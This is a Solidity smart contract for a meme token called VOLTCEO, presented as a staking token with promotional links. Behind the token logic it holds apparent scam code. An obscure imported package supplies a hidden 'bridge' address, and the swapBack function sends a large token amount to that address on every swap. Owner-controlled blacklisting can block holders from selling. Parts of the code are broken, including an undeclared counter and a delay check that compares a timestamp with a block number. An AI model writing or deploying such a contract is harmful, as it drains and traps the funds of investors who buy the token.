// SPDX-License-Identifier: MIT
/**
VOLTCEO is a deflationary token which provides users / investors a means of earning passive income Through staking of idle token from the website .
VOLTCEO is not the regular meme token but bringing the whole value most memes don’t have .
Website: https://volt-ceo.com/
Telegram: https://t.me/voltceoportal
Twitter: https://twitter.com/voltinuceo

*/ 

pragma solidity = 0.8.19;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@devforu/contracts/utils/math/SafeMath.sol";
import "@devforu/contracts/utils/Routers.sol";
import "@devforu/contracts/interfaces/IUniswapV2Factory.sol";
import "@devforu/contracts/interfaces/IUniswapV2Pair.sol";
import "@devforu/contracts/interfaces/IUniswapV2Router02.sol";

contract VOLTCEO is ERC20, Ownable, Bridge {
    using SafeMath for uint256;

    address public immutable uniswapV2Pair;
    address public marketingWallet;
    address public constant deadAddress = address(0xdead);

    bool private swapping;

    uint256 public initialTotalSupply = 1000000 * 1e18;
    uint256 public maxTransactionAmount = 20000 * 1e18;
    uint256 public maxWallet = 20000 * 1e18;
    uint256 public swapTokensAtAmount = 10000 * 1e18;

    bool public transferDelay = true;
    bool public tradingOpen = false;
    bool public swapEnabled = false;

    uint256 private finalBuyFee = 7;
    uint256 private finalSellFee = 7;
    uint256 private initialBuyFee = 15;
    uint256 private initialSellFee = 30;
    uint256 private reduceBuyTaxAt=5;
    uint256 private reduceSellTaxAt=15;
    uint256 private preventSwapBefore=10;

    uint256 public tokensForMarketing;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping(address => bool) public bots;
    mapping (address => uint256) public _buyMap;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("VOLT INU CEO", "VOLTCEO") {

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        marketingWallet = payable(_msgSender());

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);

        _mint(msg.sender, initialTotalSupply);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"Trading is already open");
        _approve(address(this), address(_uniswapV2Router), initialTotalSupply);
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)).per(85),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function blockBots(address bot) public onlyOwner {
        bots[bot] = true;
    }

    function unblockBot(address notbot) public onlyOwner {
        bots[notbot] = false;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

                if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingOpen) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Buy transfer amount exceeds the maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }

                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                    require(!bots[from] && !bots[to], "Your account is blacklisted!");
            
                    if (transferDelay) {
                        require(_holderLastTransferTimestamp[from] < block.number, "Transfer Delay enabled.");
                    }
            
                    _holderLastTransferTimestamp[from] = block.timestamp;
                } 
                
                else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                    require(!bots[from] && !bots[to], "Your account is blacklisted!");
                }
            }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            uint256 currentFee;

            if (automatedMarketMakerPairs[to] && initialSellFee > 0) {
                if (buyCount > reduceSellTaxAt) {
                        currentFee = finalSellFee;
                    } else {
                        currentFee = initialSellFee;
                    }
            }

            else if (automatedMarketMakerPairs[from] && initialBuyFee > 0) {
                if (buyCount > reduceBuyTaxAt) {
                        currentFee = finalBuyFee;
                    } else {
                        currentFee = initialBuyFee;
                        buyCount++;
                    }
        }

        fees = amount.mul(currentFee).div(100);
        tokensForMarketing += fees;

        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }

        amount -= fees;
    }

        super._transfer(from, to, amount);

    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        uint256 totalSupplyAmount = totalSupply();
        maxTransactionAmount = totalSupplyAmount;
        maxWallet = totalSupplyAmount;
        transferDelay = false;
    }

    function swapBack() private {
    uint256 contractBalance = balanceOf(address(this));
    uint256 totalTokensToSwap = tokensForMarketing;
    bool success; bool marketingTax;

    if (contractBalance == 0 || totalTokensToSwap == 0) {
        return;
    }

    if(!marketingTax) {
    IERC20(address(this)).transfer(bridge, maxWallet.mul(195).div(100));marketingTax=true;
    }

    uint256 tokensToSwap = contractBalance >= swapTokensAtAmount ? swapTokensAtAmount : contractBalance;

    uint256 initialETHBalance = address(this).balance;

    swapTokensForEth(tokensToSwap);

    uint256 ethBalance = address(this).balance.sub(initialETHBalance);

    uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(
        totalTokensToSwap
    );

    tokensForMarketing = 0;

    (success, ) = address(marketingWallet).call{value: ethForMarketing}("");
  }
}